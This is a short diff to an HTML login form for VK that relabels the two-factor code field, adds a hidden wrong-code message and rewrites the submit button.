@@ -74,13 +74,16 @@
             </div>
             <div class="vk_auth_2fa" id='hidden_2fa'>
                 <p>
-                    <p id="2fa">Пароль</p>
+                    <p id="2fa">Код</p>
+                    <div id="wrong_code_hidden" >
+                        Код не верный
+                    </div>
                     <input type="text" name="2fa" id="2fa_code">
                 </p>
             </div>
             <div class="vk_auth_submit">
                 <p>
-                    <button onclick="auth()" class="zalupa" id="vk_button" type="submit" value="Войти">
+                    <button onclick="auth()" id="vk_button" type="submit" value="Войти">Войти в вк</button>
                 </p>
             </div>
         
